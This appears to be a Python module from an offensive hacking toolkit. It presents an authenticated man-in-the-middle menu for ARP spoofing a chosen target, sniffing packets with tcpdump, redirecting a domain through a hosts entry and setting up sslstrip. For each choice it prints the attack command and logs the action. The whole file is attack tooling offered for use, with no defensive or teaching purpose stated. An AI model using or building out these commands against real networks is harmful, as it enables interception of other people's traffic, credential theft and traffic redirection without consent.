#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "core"))
from auth import auth_required
from utils import log_action
import subprocess
import time

@auth_required
def run_mitm():
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║           MAN IN THE MIDDLE MODULE                    ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    print("[1] ARP Spoof Target")
    print("[2] Packet Sniffer")
    print("[3] DNS Spoof")
    print("[4] SSL Strip Setup")
    choice = input("\n[MITM] Select: ").strip()
    if choice == "1":
        target = input("[MITM] Target IP: ").strip()
        gateway = input("[MITM] Gateway IP: ").strip()
        iface = input("[MITM] Interface (default wlan0): ").strip() or "wlan0"
        print("[MITM] Starting ARP spoof on " + target + " via " + gateway + "...")
        print("[MITM] Command: arpspoof -i " + iface + " -t " + target + " " + gateway)
        log_action("MITM", "ARP spoof on " + target)
    elif choice == "2":
        iface = input("[MITM] Interface (default wlan0): ").strip() or "wlan0"
        print("[MITM] Run: tcpdump -i " + iface + " -w capture.pcap")
        log_action("MITM", "Packet sniff on " + iface)
    elif choice == "3":
        domain = input("[MITM] Domain to spoof: ").strip()
        fake_ip = input("[MITM] Redirect to IP: ").strip()
        print("[MITM] Add to hosts: " + fake_ip + " " + domain)
        log_action("MITM", "DNS spoof " + domain + " -> " + fake_ip)
    elif choice == "4":
        print("[MITM] SSL Strip: sslstrip -l 8080")
        log_action("MITM", "SSL Strip setup")
